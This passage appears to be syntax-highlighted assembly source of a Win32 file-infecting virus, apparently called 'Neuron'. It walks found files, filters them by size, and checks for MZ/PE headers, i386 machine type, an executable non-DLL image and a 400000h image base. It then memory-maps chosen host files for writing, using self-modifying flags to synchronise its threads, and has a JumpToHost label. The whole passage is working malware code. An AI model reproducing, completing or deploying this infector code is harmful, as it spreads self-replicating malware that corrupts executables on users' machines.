    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">nOpenFile_run</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">nCloseFile_run</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">JumpToHost</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ExitThread</span><span class="sc0">                  </span><span class="sc1">;quit</span><span class="sc0">
</span><span class="sc5">Neuron_Find</span><span class="sc0"> </span><span class="sc9">EndP</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">Neuron_CheckFile</span><span class="sc0">    </span><span class="sc9">Proc</span><span class="sc0"> </span><span class="sc10">PASCAL</span><span class="sc0"> </span><span class="sc10">uses</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">delta_param</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc0">
</span><span class="sc5">n_checkfile</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">delta_param</span><span class="sc0">

</span><span class="sc5">n11</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">check_susp</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">123</span><span class="sc0">
</span><span class="sc5">nCheck_run</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">check_susp</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">nCheck_run</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">11h</span><span class="sc0">         </span><span class="sc1">;quit ?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">ExitThread</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                    </span><span class="sc1">;discard directories</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">WFD.WFD_dwFileAttributes</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">FILE_ATTRIBUTE_DIRECTORY</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">end_chkfile</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">WFD.WFD_nFileSizeHigh</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">      </span><span class="sc1">;discard huge files</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">end_chkfile</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">WFD.WFD_nFileSizeLow</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1000h</span><span class="sc0">                  </span><span class="sc1">;discard file &lt; 4096</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">end_chkfile</span><span class="sc0">

</span><span class="sc5">n12</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                    </span><span class="sc1">;open file</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">nopen_param2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">WFD.WFD_szFileName</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">nopen_param1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">nOpenFile_run</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;synchronizin threads</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
</span><span class="sc5">nCheck1_wait</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">nCheck1_wait</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">end_closefile</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">lpFile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">IMAGE_DOS_SIGNATURE</span><span class="sc0">     </span><span class="sc1">;must be MZ</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">end_closefile</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edx.MZ_res2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">end_closefile</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edx.MZ_lfanew</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">end_closefile</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">WFD.WFD_nFileSizeLow</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;valid MZ_lfanew ?</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">end_closefile</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">IMAGE_NT_SIGNATURE</span><span class="sc0">     </span><span class="sc1">;must be PE\0\0</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">end_closefile</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ecx.NT_FileHeader.FH_Machine</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">IMAGE_FILE_MACHINE_I386</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">end_closefile</span><span class="sc0">               </span><span class="sc1">;must be 386+</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ecx.NT_FileHeader.FH_Characteristics</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IMAGE_FILE_EXECUTABLE_IMAGE</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">IMAGE_FILE_DLL</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">end_closefile</span><span class="sc0">               </span><span class="sc1">;must be executable, mustnt be DLL</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ecx.NT_OptionalHeader.OH_ImageBase</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">400000h</span><span class="sc0">   </span><span class="sc1">;image base</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">end_closefile</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'Levi'</span><span class="sc0">                 </span><span class="sc1">;toggle flag</span><span class="sc0">

</span><span class="sc5">end_closefile</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">n13</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                    </span><span class="sc1">;close file</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">nclose_param2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">nclose_param1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">nCloseFile_run</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;synchronize threads</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
</span><span class="sc5">nCheck2_wait</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">nCheck2_wait</span><span class="sc0">

</span><span class="sc5">end_chkfile</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">n14</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'Levi'</span><span class="sc0">                 </span><span class="sc1">;check flag</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">@20</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">@20</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">nCheck_run</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">check_susp</span><span class="sc0">
</span><span class="sc5">Neuron_CheckFile</span><span class="sc0">    </span><span class="sc9">EndP</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">Neuron_OpenFile</span><span class="sc0"> </span><span class="sc9">Proc</span><span class="sc0"> </span><span class="sc10">PASCAL</span><span class="sc0"> </span><span class="sc10">uses</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">delta_param</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc0">
</span><span class="sc5">n_openfile</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">delta_param</span><span class="sc0">

</span><span class="sc5">n15</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">open_susp</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">123</span><span class="sc0">
</span><span class="sc5">nOpenFile_run</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">open_susp</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">nOpenFile_run</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">11h</span><span class="sc0">          </span><span class="sc1">;quit ?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">ExitThread</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">nopen_param1</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">             </span><span class="sc1">;name</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">nopen_param2</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">open_write</span><span class="sc0">                </span><span class="sc1">;open write mode</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">next_open</span><span class="sc0">
</span><span class="sc5">open_write</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">              </span><span class="sc1">;size</span><span class="sc0">
</span><span class="sc5">nopen_param3</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">next_open</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">n16</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">lpFile</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">OPEN_EXISTING</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">rcr</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ddCreateFileA</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;open file</span><span class="sc0">
    </span><span class="sc6">cdq</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hFile</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">end_OpenFile</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">PAGE_READONLY</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ddCreateFileMappingA</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;create mapping of file</span><span class="sc0">
    </span><span class="sc6">cdq</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hMapFile</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">end_OpenFile2</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">FILE_MAP_READ</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ddMapViewOfFile</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;map file to address space</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">lpFile</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">end_OpenFile3</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@e</span><span class="sc0">

</span><span class="sc5">end_OpenFile</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">@e</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">nOpenFile_run</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">open_susp</span><span class="sc0">
</span><span class="sc5">end_OpenFile2</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">nclose_param1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">nCloseFile_run</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
